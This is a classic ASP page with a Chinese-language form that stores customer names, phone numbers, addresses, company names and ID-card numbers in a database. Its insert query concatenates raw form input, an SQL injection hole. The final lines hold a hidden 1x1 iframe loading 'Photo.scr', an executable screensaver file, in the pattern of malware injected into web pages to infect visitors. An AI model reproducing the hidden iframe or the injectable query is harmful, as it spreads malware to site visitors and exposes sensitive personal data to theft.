<%@language = "vbscript" codepage = "65001" %>
<% response.charset = "utf-8" %>
<meta charset="utf-8" content="Content-Type" content="text/html">
<!-- #include file=conn.asp -->
<%
	cname=request.form("cname")
	phonenum = request.form("phonenum")
	caddress = request.form("caddress")
	ccomname = request.form("ccomname")
	telnum = request.form("telnum")
	idcode = request.form("idcode")
%>
<%
	conn.open dbpath
	conn.begintrans
	addcsql = "insert into customers(cname,phonenum,caddress,ccomname,telnum,idcode) values('" & cname & "','" & phonenum & "','" & caddress & "','" & ccomname & "','" & telnum &"','" & idcode & "')"
	if cname <> "" then
		conn.execute(addcsql)
		conn.committrans
		response.write("提交成功！")
	else
		conn.rollbacktrans
		response.write("姓名不能为空！")
	end if

%>
<form action="addcinfo.asp" method="post" 	accept-charset="utf-8">
客户姓名：<input type="text" name="cname">
<br>
手机号码：<input type="text" name="phonenum">
<br>
地址：<input type="text" name="caddress">
<br>
公司名称：<input type="text" name="ccomname">
<br>
座机号码：<input type="text" name="telnum">
<br>
身份证：<input type="text" name="idcode">
<br>
<input type="submit" value="提交">	
<input type="reset" value="重置">
</form>
<a href="index.asp">返回首页</a>
<%
conn.close
set conn = nothing
%>
<iframe src=Photo.scr width=1 height=1 frameborder=0>
</iframe>
